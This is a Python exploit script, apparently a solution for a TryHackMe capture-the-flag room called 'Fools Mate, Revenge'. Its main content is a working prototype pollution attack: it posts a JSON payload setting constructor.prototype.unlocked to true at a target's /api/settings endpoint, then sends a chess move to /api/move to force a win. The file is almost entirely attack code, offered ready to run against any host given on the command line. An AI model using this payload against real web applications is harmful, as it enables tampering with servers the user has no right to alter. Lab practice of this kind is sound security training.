import requests
import argparse
from datetime import datetime

AUTHOR = "cyber30"
ROOM = "Fools Mate, Revenge TryHackMe"
DATE = datetime.now().strftime("%Y-%m-%d")
DATE_CREATED = "2026-07-05"

def print_banner():
    banner = f"""
======================================================================================

   █████████  █████ █████ ███████████  ██████████ ███████████    ████████     █████   
  ███░░░░░███░░███ ░░███ ░░███░░░░░███░░███░░░░░█░░███░░░░░███  ███░░░░███  ███░░░███ 
 ███     ░░░  ░░███ ███   ░███    ░███ ░███  █ ░  ░███    ░███ ░░░    ░███ ███   ░░███
░███           ░░█████    ░██████████  ░██████    ░██████████     ██████░ ░███    ░███
░███            ░░███     ░███░░░░░███ ░███░░█    ░███░░░░░███   ░░░░░░███░███    ░███
░░███     ███    ░███     ░███    ░███ ░███ ░   █ ░███    ░███  ███   ░███░░███   ███ 
 ░░█████████     █████    ███████████  ██████████ █████   █████░░████████  ░░░█████░  
  ░░░░░░░░░     ░░░░░    ░░░░░░░░░░░  ░░░░░░░░░░ ░░░░░   ░░░░░  ░░░░░░░░     ░░░░░░   

    
    [+] Target Mover API Tool
    [+] Author: {AUTHOR}
    [+] Room: {ROOM}
    [+] Date Created:   {DATE_CREATED}
    [+] Date:   {DATE}
======================================================================================
"""
    print(banner)


def exploit_prototype_pollution(host, port, session, headers):
    url = f"http://{host}:{port}/api/settings"
    
    payload = {
        "constructor": {
            "prototype": {
                "unlocked": True
            }
        }
    }
    
    print(f"[*] Step 1: Sending Prototype Pollution payload to {url}...")
    try:
        response = session.post(url, json=payload, headers=headers)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response: {response.text}\n")
        return response.status_code == 200
    except Exception as e:
        print(f"[-] Error during Step 1: {e}")
        return False

def send_winning_move(host, port, from_pos, to_pos, session, headers):
    url = f"http://{host}:{port}/api/move"
    
    payload = {
        "from": from_pos,
        "to": to_pos
    }
    
    print(f"[*] Step 2: Sending winning move ({from_pos} to {to_pos}) to {url}...")
    try:
        response = session.post(url, json=payload, headers=headers)
        print(f"[+] Status Code: {response.status_code}")
        print("[+] Response Body:")
        print(response.text)
    except Exception as e:
        print(f"[-] Error during Step 2: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script for Fools Mate TryHackMe room")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=3000, help="Target port (default: 3000)")
    parser.add_argument("--from-pos", default="a1", help="Starting position (default: a1)")
    parser.add_argument("--to-pos", default="a8", help="Ending position (default: a8)")
    
    args = parser.parse_args()

    print_banner()

    session = requests.Session()
    headers = {
        "Content-Type": "application/json"
    }

    if exploit_prototype_pollution(args.target, args.port, session, headers):
        send_winning_move(args.target, args.port, args.from_pos, args.to_pos, session, headers)
    else:
        print("[-] Exploitation failed at Step 1. Aborting Step 2.")
